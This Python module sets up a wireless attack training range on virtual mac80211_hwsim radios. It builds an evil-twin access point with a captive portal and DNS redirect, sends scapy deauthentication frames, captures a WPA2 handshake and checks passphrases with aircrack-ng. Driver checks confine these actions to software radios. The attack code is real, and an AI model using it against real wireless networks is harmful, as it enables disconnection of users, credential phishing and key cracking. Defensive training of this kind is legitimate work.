from __future__ import annotations

import json
import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

LAB_DIR = Path("/tmp/obt-scorpion-range")
STATE = LAB_DIR / "state.json"
HANDSHAKE = LAB_DIR / "handshake.pcap"


def _run(cmd: list[str], timeout: int = 12, env: dict | None = None) -> tuple[int, str]:
    try:
        p = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
            env=env,
        )
        return p.returncode, (p.stdout + p.stderr).strip()
    except Exception as exc:
        return 1, str(exc)


def _all_interfaces() -> list[str]:
    code, out = _run(["iw", "dev"])
    if code != 0:
        return []
    found: list[str] = []
    for raw in out.splitlines():
        line = raw.strip()
        if line.startswith("Interface "):
            found.append(line.split(maxsplit=1)[1])
    return found


def _driver_name(iface: str) -> str:
    path = Path("/sys/class/net") / iface / "device" / "driver"
    try:
        return path.resolve().name
    except Exception:
        return ""


def _mac(iface: str) -> str:
    try:
        return (Path("/sys/class/net") / iface / "address").read_text().strip().lower()
    except Exception:
        return ""


def hwsim_interfaces() -> list[str]:
    return [i for i in _all_interfaces() if _driver_name(i) == "mac80211_hwsim"]


def _assert_hwsim(*ifaces: str) -> tuple[bool, str]:
    for iface in ifaces:
        if not iface or _driver_name(iface) != "mac80211_hwsim":
            return False, f"safety lock: {iface or '<none>'} is not mac80211_hwsim"
    return True, ""


def _read_state() -> dict:
    try:
        return json.loads(STATE.read_text())
    except Exception:
        return {}


def _write_state(state: dict) -> None:
    LAB_DIR.mkdir(parents=True, exist_ok=True)
    STATE.write_text(json.dumps(state, indent=2))


def _kill_pidfile(name: str) -> bool:
    p = LAB_DIR / name
    if not p.exists():
        return False
    try:
        pid = int(p.read_text().strip())
        os.kill(pid, signal.SIGTERM)
        time.sleep(0.05)
    except ProcessLookupError:
        pass
    except Exception:
        pass
    try:
        p.unlink()
    except FileNotFoundError:
        pass
    return True


def stop_lab_services() -> dict:
    stopped = []
    for name in ("client.pid", "portal.pid", "dnsmasq.pid", "ap1.pid", "ap2.pid"):
        if _kill_pidfile(name):
            stopped.append(name)
    for iface in hwsim_interfaces():
        _run(["ip", "addr", "flush", "dev", iface])
    return {"ok": True, "stopped": stopped}


def lab_status() -> dict:
    code, out = _run(["iw", "phy"])
    loaded = "mac80211_hwsim" in _run(["lsmod"])[1]
    phys = [line.strip() for line in out.splitlines() if line.strip().startswith("Wiphy ")]
    return {
        "mac80211_hwsim_loaded": loaded,
        "phys": phys,
        "hwsim_interfaces": hwsim_interfaces(),
        "iw_status": code,
        "state": _read_state(),
        "handshake_capture": str(HANDSHAKE) if HANDSHAKE.exists() else None,
        "portal_events": str(LAB_DIR / "portal_events.jsonl"),
    }


def create_virtual_radios(radios: int = 4) -> dict:
    if os.geteuid() != 0:
        return {"ok": False, "error": "root privileges required"}
    if not shutil.which("modprobe"):
        return {"ok": False, "error": "modprobe not found"}

    stop_lab_services()
    _run(["modprobe", "-r", "mac80211_hwsim"])
    code, out = _run(["modprobe", "mac80211_hwsim", f"radios={radios}"])
    status = lab_status()
    status.update({"ok": code == 0, "loader_output": out, "requested_radios": radios})
    return status


def _hostapd_config(
    iface: str,
    ssid: str,
    channel: int,
    psk: str | None = None,
) -> str:
    base = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
ignore_broadcast_ssid=0
logger_stdout=-1
logger_stdout_level=2
"""
    if not psk:
        return base + "wpa=0\n"

    return base + f"""wpa=2
wpa_passphrase={psk}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ieee80211w=1
"""


def start_twin_demo(
    ssid: str = "OBT_LAB",
    lab_psk: str = "ScorpionLab2026!",
) -> dict:
    """Run WPA2 original + open same-SSID twin on software radios only."""
    if os.geteuid() != 0:
        return {"ok": False, "error": "root privileges required"}
    if not shutil.which("hostapd"):
        return {"ok": False, "error": "hostapd not installed"}
    if len(lab_psk) < 8 or len(lab_psk) > 63:
        return {"ok": False, "error": "lab PSK must be 8-63 characters"}

    ifaces = hwsim_interfaces()
    if len(ifaces) < 4:
        created = create_virtual_radios(4)
        if not created.get("ok"):
            return created
        ifaces = hwsim_interfaces()

    if len(ifaces) < 4:
        return {"ok": False, "error": "could not obtain 4 mac80211_hwsim radios"}

    original, twin, observer, client = ifaces[:4]
    safe, error = _assert_hwsim(original, twin, observer, client)
    if not safe:
        return {"ok": False, "error": error}

    stop_lab_services()
    LAB_DIR.mkdir(parents=True, exist_ok=True)
    cfg1 = LAB_DIR / "ap1.conf"
    cfg2 = LAB_DIR / "ap2.conf"
    cfg1.write_text(_hostapd_config(original, ssid, 1, lab_psk))
    cfg2.write_text(_hostapd_config(twin, ssid, 6, None))

    for iface in (original, twin, observer, client):
        _run(["ip", "link", "set", iface, "down"])
        _run(["iw", "dev", iface, "set", "type", "managed"])
        _run(["ip", "link", "set", iface, "up"])

    c1, o1 = _run(["hostapd", "-B", "-P", str(LAB_DIR / "ap1.pid"), str(cfg1)])
    c2, o2 = _run(["hostapd", "-B", "-P", str(LAB_DIR / "ap2.pid"), str(cfg2)])

    ok = c1 == 0 and c2 == 0
    if not ok:
        stop_lab_services()
        return {"ok": False, "hostapd_output": [o1, o2]}

    state = {
        "mode": "software-radio-only",
        "ssid": ssid,
        "lab_psk": lab_psk,
        "original": {
            "interface": original,
            "channel": 1,
            "bssid": _mac(original),
            "security": "WPA2-PSK",
        },
        "twin": {
            "interface": twin,
            "channel": 6,
            "bssid": _mac(twin),
            "security": "OPEN-CAPTIVE-LAB",
        },
        "observer": {"interface": observer, "bssid": _mac(observer)},
        "client": {"interface": client, "bssid": _mac(client)},
    }
    _write_state(state)
    return {"ok": True, **state}


def start_captive_stack(lab_token: str = "OBT-LAB-2026") -> dict:
    """Start DHCP, DNS wildcard redirect and portal strictly on the hwsim twin."""
    if os.geteuid() != 0:
        return {"ok": False, "error": "root privileges required"}
    state = _read_state()
    twin = state.get("twin", {}).get("interface")
    safe, error = _assert_hwsim(twin)
    if not safe:
        return {"ok": False, "error": error}
    if not shutil.which("dnsmasq"):
        return {"ok": False, "error": "dnsmasq not installed"}

    _kill_pidfile("dnsmasq.pid")
    _kill_pidfile("portal.pid")
    _run(["ip", "addr", "flush", "dev", twin])
    _run(["ip", "addr", "add", "10.77.0.1/24", "dev", twin])
    _run(["ip", "link", "set", twin, "up"])

    dns_log = LAB_DIR / "dnsmasq.log"
    code, out = _run([
        "dnsmasq",
        "--interface=" + twin,
        "--bind-interfaces",
        "--dhcp-range=10.77.0.20,10.77.0.100,255.255.255.0,1h",
        "--dhcp-option=3,10.77.0.1",
        "--dhcp-option=6,10.77.0.1",
        "--address=/#/10.77.0.1",
        "--no-resolv",
        "--log-queries",
        "--log-dhcp",
        "--log-facility=" + str(dns_log),
        "--pid-file=" + str(LAB_DIR / "dnsmasq.pid"),
    ])
    if code != 0:
        return {"ok": False, "error": out or "dnsmasq failed"}

    env = dict(os.environ)
    env.update({
        "OBT_LAB_DIR": str(LAB_DIR),
        "OBT_LAB_TOKEN": lab_token,
        "OBT_PORTAL_BIND": "10.77.0.1",
        "OBT_PORTAL_PORT": "80",
    })
    log = (LAB_DIR / "portal.log").open("a")
    proc = subprocess.Popen(
        [sys.executable, "-m", "obt_scorpion.portal_server"],
        stdout=log,
        stderr=log,
        env=env,
        start_new_session=True,
    )
    (LAB_DIR / "portal.pid").write_text(str(proc.pid))

    state["captive"] = {
        "interface": twin,
        "gateway": "10.77.0.1",
        "dhcp_range": "10.77.0.20-10.77.0.100",
        "dns_redirect": "all names -> 10.77.0.1",
        "portal": "http://10.77.0.1/",
        "training_token_hint": "submissions are validated but never stored",
    }
    _write_state(state)
    return {"ok": True, **state["captive"]}


def lab_deauth_burst(count: int = 6) -> dict:
    """Transmit deauth frames only inside mac80211_hwsim to the lab original AP."""
    if os.geteuid() != 0:
        return {"ok": False, "error": "root privileges required"}
    state = _read_state()
    observer = state.get("observer", {}).get("interface")
    ap_bssid = state.get("original", {}).get("bssid")
    safe, error = _assert_hwsim(observer)
    if not safe:
        return {"ok": False, "error": error}

    allowed_bssids = {
        state.get("original", {}).get("bssid"),
        state.get("twin", {}).get("bssid"),
    }
    if not ap_bssid or ap_bssid not in allowed_bssids:
        return {"ok": False, "error": "scope lock: AP BSSID is not a lab hwsim BSSID"}

    try:
        from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp  # type: ignore
    except Exception:
        return {"ok": False, "error": "python3-scapy not installed"}

    _run(["ip", "link", "set", observer, "down"])
    _run(["iw", "dev", observer, "set", "type", "monitor"])
    _run(["iw", "dev", observer, "set", "channel", "1"])
    _run(["ip", "link", "set", observer, "up"])

    broadcast = "ff:ff:ff:ff:ff:ff"
    frame = RadioTap() / Dot11(
        type=0,
        subtype=12,
        addr1=broadcast,
        addr2=ap_bssid,
        addr3=ap_bssid,
    ) / Dot11Deauth(reason=7)

    frames = max(1, min(int(count), 20))
    sendp(frame, iface=observer, count=frames, inter=0.08, verbose=False)

    return {
        "ok": True,
        "mode": "mac80211_hwsim-only",
        "interface": observer,
        "target_bssid": ap_bssid,
        "frames_sent": frames,
        "note": "Physical adapters are rejected before frame transmission.",
    }


def capture_lab_handshake(duration: int = 10) -> dict:
    """Generate and capture a WPA2 handshake only inside the hwsim arena."""
    if os.geteuid() != 0:
        return {"ok": False, "error": "root privileges required"}
    if not shutil.which("tshark") or not shutil.which("wpa_supplicant"):
        return {"ok": False, "error": "tshark and wpa_supplicant are required"}

    state = _read_state()
    observer = state.get("observer", {}).get("interface")
    client = state.get("client", {}).get("interface")
    original = state.get("original", {}).get("interface")
    ssid = state.get("ssid")
    psk = state.get("lab_psk")
    bssid = state.get("original", {}).get("bssid")

    safe, error = _assert_hwsim(observer, client, original)
    if not safe:
        return {"ok": False, "error": error}
    if not all((ssid, psk, bssid)):
        return {"ok": False, "error": "start the Twin Arena first"}

    _kill_pidfile("client.pid")
    try:
        HANDSHAKE.unlink()
    except FileNotFoundError:
        pass

    _run(["ip", "link", "set", observer, "down"])
    _run(["iw", "dev", observer, "set", "type", "monitor"])
    _run(["iw", "dev", observer, "set", "channel", "1"])
    _run(["ip", "link", "set", observer, "up"])

    _run(["ip", "link", "set", client, "down"])
    _run(["iw", "dev", client, "set", "type", "managed"])
    _run(["ip", "link", "set", client, "up"])

    client_conf = LAB_DIR / "client.conf"
    client_conf.write_text(
        'ctrl_interface=/run/wpa_supplicant\n'
        'network={\n'
        f'    ssid="{ssid}"\n'
        f'    bssid={bssid}\n'
        '    key_mgmt=WPA-PSK\n'
        f'    psk="{psk}"\n'
        '}\n'
    )

    cap_log = (LAB_DIR / "tshark.log").open("a")
    capture = subprocess.Popen(
        [
            "tshark",
            "-i",
            observer,
            "-a",
            f"duration:{max(5, min(int(duration), 30))}",
            "-w",
            str(HANDSHAKE),
        ],
        stdout=cap_log,
        stderr=cap_log,
        start_new_session=True,
    )

    time.sleep(1.0)
    code, supplicant_out = _run([
        "wpa_supplicant",
        "-B",
        "-P",
        str(LAB_DIR / "client.pid"),
        "-i",
        client,
        "-c",
        str(client_conf),
    ])

    try:
        capture.wait(timeout=max(8, min(int(duration), 30)) + 5)
    except subprocess.TimeoutExpired:
        capture.terminate()
        capture.wait(timeout=3)

    status_code, status_out = _run(["wpa_cli", "-i", client, "status"])

    if not HANDSHAKE.exists():
        return {
            "ok": False,
            "error": "capture was not created",
            "wpa_supplicant": supplicant_out,
        }

    from .pcap_analyzer import inspect_pcap

    analysis = inspect_pcap(HANDSHAKE)
    state["handshake_capture"] = str(HANDSHAKE)
    _write_state(state)

    return {
        "ok": code == 0,
        "capture": str(HANDSHAKE),
        "client_status": status_out if status_code == 0 else "unavailable",
        "analysis": analysis,
    }


def validate_lab_psk(candidate: str) -> dict:
    """Validate one candidate only against the hwsim-generated lab capture."""
    state = _read_state()
    original = state.get("original", {}).get("interface")
    bssid = state.get("original", {}).get("bssid")
    safe, error = _assert_hwsim(original)
    if not safe:
        return {"ok": False, "error": error}
    if not HANDSHAKE.exists() or state.get("handshake_capture") != str(HANDSHAKE):
        return {"ok": False, "error": "no SCORPION-generated lab handshake is registered"}
    if not bssid:
        return {"ok": False, "error": "lab BSSID missing"}
    if not shutil.which("aircrack-ng"):
        return {"ok": False, "error": "aircrack-ng not installed"}

    candidate = candidate[:63]
    if len(candidate) < 8:
        return {"ok": False, "error": "WPA2 candidate must be at least 8 characters"}

    wordlist = LAB_DIR / ".one_candidate"
    wordlist.write_text(candidate + "\n")
    try:
        code, out = _run([
            "aircrack-ng",
            "-q",
            "-a",
            "2",
            "-b",
            bssid,
            "-w",
            str(wordlist),
            str(HANDSHAKE),
        ], timeout=25)
    finally:
        try:
            wordlist.unlink()
        except FileNotFoundError:
            pass

    valid = "KEY FOUND!" in out.upper()
    return {
        "ok": code in (0, 1),
        "candidate_valid": valid,
        "capture": str(HANDSHAKE),
        "target": bssid,
        "mode": "single-candidate hwsim-lab validation",
    }


def portal_events(limit: int = 20) -> list[dict]:
    p = LAB_DIR / "portal_events.jsonl"
    if not p.exists():
        return []
    rows = []
    for line in p.read_text(errors="ignore").splitlines()[-limit:]:
        try:
            rows.append(json.loads(line))
        except Exception:
            pass
    return rows


def destroy_virtual_radios() -> dict:
    if os.geteuid() != 0:
        return {"ok": False, "error": "root privileges required"}
    stopped = stop_lab_services()
    code, out = _run(["modprobe", "-r", "mac80211_hwsim"])
    try:
        STATE.unlink()
    except FileNotFoundError:
        pass
    return {"ok": code == 0, "output": out, "services": stopped}


def lab_menu() -> dict:
    print("""
SCORPION WIRELESS ATTACK / DEFENSE RANGE
────────────────────────────────────────
Hard safety boundary: mac80211_hwsim software radios only.
No physical RF adapter can be used by active lab actions.

[1] Create 4 virtual radios
[2] Start WPA2 original + same-SSID Twin Arena
[3] Start DHCP + DNS redirect + Captive Portal
[4] Send lab-only deauth burst
[5] Capture WPA2 4-way handshake in the lab
[6] Validate one PSK candidate against SCORPION lab capture
[7] Show lab status
[8] Show portal training events
[9] Stop lab services
[10] Destroy virtual radios
[0] Back
""")
    choice = input("lab> ").strip()

    if choice == "1":
        result = create_virtual_radios(4)
    elif choice == "2":
        ssid = input("Lab SSID [OBT_LAB]: ").strip() or "OBT_LAB"
        psk = input("Synthetic lab PSK [ScorpionLab2026!]: ").strip() or "ScorpionLab2026!"
        result = start_twin_demo(ssid, psk)
    elif choice == "3":
        token = input("Training token [OBT-LAB-2026]: ").strip() or "OBT-LAB-2026"
        result = start_captive_stack(token)
    elif choice == "4":
        raw = input("Frame count [6, max 20]: ").strip() or "6"
        try:
            count = int(raw)
        except ValueError:
            count = 6
        result = lab_deauth_burst(count)
    elif choice == "5":
        raw = input("Capture seconds [10]: ").strip() or "10"
        try:
            duration = int(raw)
        except ValueError:
            duration = 10
        result = capture_lab_handshake(duration)
    elif choice == "6":
        candidate = input("Synthetic lab PSK candidate: ").strip()
        result = validate_lab_psk(candidate)
    elif choice == "7":
        result = lab_status()
    elif choice == "8":
        result = {"ok": True, "events": portal_events()}
    elif choice == "9":
        result = stop_lab_services()
    elif choice == "10":
        result = destroy_virtual_radios()
    else:
        result = {"ok": True, "action": "back"}

    print(json.dumps(result, indent=2, ensure_ascii=False))
    return result
